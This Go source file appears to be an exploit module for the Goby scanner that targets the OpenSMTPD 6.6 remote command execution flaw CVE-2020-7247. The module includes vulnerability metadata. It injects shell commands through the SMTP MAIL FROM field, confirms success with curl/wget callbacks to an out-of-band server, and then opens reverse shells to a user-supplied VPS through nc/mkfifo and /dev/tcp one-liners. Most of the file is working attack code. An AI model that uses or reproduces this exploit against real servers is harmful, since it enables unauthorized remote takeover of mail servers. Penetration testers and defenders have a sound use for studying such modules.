package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "OpenSMTPD version 6.6 RCE vulnerability (CVE-2020-7247)",
    "Description": "<p>OpenSMTPD is an smtp server program for Unix operating systems (BSD, MacOS, GNU/Linux) and follows the RFC 5321 SMTP protocol.</p><p>OpenSMTPD version 6.6 smtp_session.c file has an RCE vulnerability in the smtp_mailaddr function. Attacker uses this vulnerability to arbitrarily execute code on the server side, write the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "OpenSMTPD",
    "Homepage": "https://github.com/OpenSMTPD/OpenSMTPD",
    "DisclosureDate": "2021-11-13",
    "Author": "keeeee",
    "FofaQuery": "(banner=\"OpenSMTPD\") || banner=\"OpenSMTPD\"",
    "GobyQuery": "(banner=\"OpenSMTPD\") || banner=\"OpenSMTPD\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a solution,Please upgrade the product to OpenSMTPD 6.6.2p1 or above:<a href=\"https://github.com/OpenSMTPD/OpenSMTPD/releases\">https://github.com/OpenSMTPD/OpenSMTPD/releases</a></p>",
    "References": [
        "https://www.anquanke.com/post/id/197689",
        "https://github.com/FiroSolutions/cve-2020-7247-exploit",
        "https://nvd.nist.gov/vuln/detail/CVE-2020-7247",
        "https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability",
        "https://www.mail-archive.com/misc@opensmtpd.org/msg04850.html",
        "https://github.com/bcoles/local-exploits/blob/master/CVE-2020-7247/root66",
        "https://www.openwall.com/lists/oss-security/2020/01/28/3"
    ],
    "Is0day": false,
    "Translation": {
        "CN": {
            "Name": "OpenSMTPD 6.6 版本命令执行漏洞（CVE-2020-7247）",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ],
            "Description": "<p>OpenSMTPD 是用于 Unix 操作系统（BSD，MacOS，GNU / Linux）的smtp服务器程序，并遵循 RFC 5321 SMTP 协议。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Product": "OpenSMTPD",
            "Recommendation": "<p>厂商已发布解决方案，请升级产品至&nbsp;</span>OpenSMTPD 6.6.2p1 或以上版本：<a href=\"https://github.com/OpenSMTPD/OpenSMTPD/releases\" target=\"_blank\">https://github.com/OpenSMTPD/OpenSMTPD/releases</a><br></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>"
        },
        "EN": {
            "Name": "OpenSMTPD version 6.6 RCE vulnerability (CVE-2020-7247)",
            "Product": "OpenSMTPD",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ],
            "Description": "<p>OpenSMTPD is an smtp server program for Unix operating systems (BSD, MacOS, GNU/Linux) and follows the RFC 5321 SMTP protocol.</p><p>OpenSMTPD version 6.6 smtp_session.c file has an RCE vulnerability in the smtp_mailaddr function. Attacker uses this vulnerability to arbitrarily execute code on the server side, write the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a solution,Please upgrade the product to OpenSMTPD 6.6.2p1 or above:<a href=\"https://github.com/OpenSMTPD/OpenSMTPD/releases\" target=\"_blank\">https://github.com/OpenSMTPD/OpenSMTPD/releases</a></p>"
        }
    },
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "reverseShell_linux_nc,reverseShell_linux_sh"
        },
        {
            "name": "ip1",
            "type": "input",
            "value": "your VPS's ip",
            "show": "attackType=reverseShell_linux_nc"
        },
        {
            "name": "port1",
            "type": "input",
            "value": "your VPS's port",
            "show": "attackType=reverseShell_linux_nc"
        },
        {
            "name": "ip2",
            "type": "input",
            "value": "your VPS's ip",
            "show": "attackType=reverseShell_linux_sh"
        },
        {
            "name": "port2",
            "type": "input",
            "value": "your VPS's port",
            "show": "attackType=reverseShell_linux_sh"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2020-7247"
    ],
    "CNNVD": [
        "CNNVD-202001-1307"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10685"
}`

	payload_tpl := "\r\n#0\r\n#1\r\n#2\r\n#3\r\n#4\r\n#5\r\n#6\r\n#7\r\n#8\r\n#9\r\n#a\r\n#b\r\n#c\r\n#d\r\n%s\r\n.\r\n"

	// 发送 payload 的函数
	sendData := func(conn net.Conn, payload string) string {
		_, err := conn.Write([]byte(payload))
		if err != nil {
			return ""
		}
		resp := make([]byte, 1024)
		_, err = conn.Read(resp)
		if err != nil {
			return ""
		}
		//fmt.Println(payload)
		//fmt.Println("\n")
		//fmt.Println(string(resp))
		return string(resp)
	}

	sendPayload := func(conn net.Conn, cmd string) bool {
		payload1 := "MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n"
		if !strings.Contains(sendData(conn, payload1), "250") {
			//fmt.Println(conn.RemoteAddr())
			return false
		}
		sendData(conn, "RCPT TO:<root>\r\n")
		sendData(conn, "DATA\r\n")
		payload2 := fmt.Sprintf(payload_tpl, cmd)
		sendData(conn, payload2)
		return true
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			conn, err := httpclient.GetTCPConn(u.HostInfo)
			if err != nil {
				return false
			}
			defer conn.Close()

			// 1.先判断是不是 smtpd
			// 没有 OpenSMTPD banner ，说明不是 OpenSMTPD。
			banner := make([]byte, 1024)
			_, err = conn.Read(banner)
			if !strings.Contains(string(banner), "OpenSMTPD") {
				return false
			}

			// 2.发送 HELO 包
			if !strings.Contains(sendData(conn, "HELO test\r\n"), "250") {
				return false
			}

			// step1:初始化
			//randomHex := strings.ToLower(goutils.RandomHexString(16))
			//// fofacli 中替换成这个：
			//foeye := goutils.FetchCfg("foeye_ip")
			////foeye := "165.22.59.16"
			//checkUrl := "http://"+foeye + "/api/v1/poc_scan/" + randomHex
			//Godserver
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)

			// opensmtpd 是 linux 上的服务，所以只需要检测 Linux 系统。(其实该漏洞主要发生在 openbsd 系统上的，自带 wget ,没有 curl )
			checkCmdLinux_curl := "curl " + checkUrl
			checkCmdLinux_wget := "wget " + checkUrl

			// step2:发送两种 payload
			sendPayload(conn, checkCmdLinux_curl)
			sendPayload(conn, checkCmdLinux_wget)

			// step3:检查
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			conn, err := httpclient.GetTCPConn(expResult.HostInfo.HostInfo)
			if err != nil {
				return expResult
			}
			defer conn.Close()

			banner := make([]byte, 1024)
			_, err = conn.Read(banner)
			if !strings.Contains(string(banner), "OpenSMTPD") {
				return expResult
			}

			// 2.发送 HELO 包
			if !strings.Contains(sendData(conn, "HELO test\r\n"), "250") {
				return expResult
			}

			attackType := ss.Params["attackType"].(string)
			if attackType == "reverseShell_linux_nc" {
				ip := ss.Params["ip1"].(string)
				port := ss.Params["port1"].(string)
				if ip == "" || port == "" {
					expResult.Output = "Please input your VPS's ip and your VPS's port"
					expResult.Success = false
				}
				cmd2 := fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ip, port)
				sendPayload(conn, cmd2)

				expResult.Output = "Go to your vps to check if you have received the reverse shell." +
					"\nIf you haven't received the reverse shell,maybe the remote machine doesn't have the nc tool , you can try another linux 'attackType' to get the reverse shell"
				expResult.Success = true

			} else if attackType == "reverseShell_linux_sh" {
				ip := ss.Params["ip2"].(string)
				port := ss.Params["port2"].(string)
				if ip == "" || port == "" {
					expResult.Output = "Please input your VPS's ip and your VPS's port"
					expResult.Success = false
				}
				cmd2 := fmt.Sprintf("sh -i >& /dev/tcp/%s/%s 0>&1", ip, port)
				sendPayload(conn, cmd2)
				expResult.Output = "Go to your vps to check if you have received the reverse shell." +
					"\nIf you haven't received the reverse shell,maybe the remote machine's sh doesn't support the format of '/dev/tcp/ip/port' , you can try another linux 'attackType' to get the reverse shell."
				expResult.Success = true

			}

			return expResult
		},
	))
}

//vulfocus
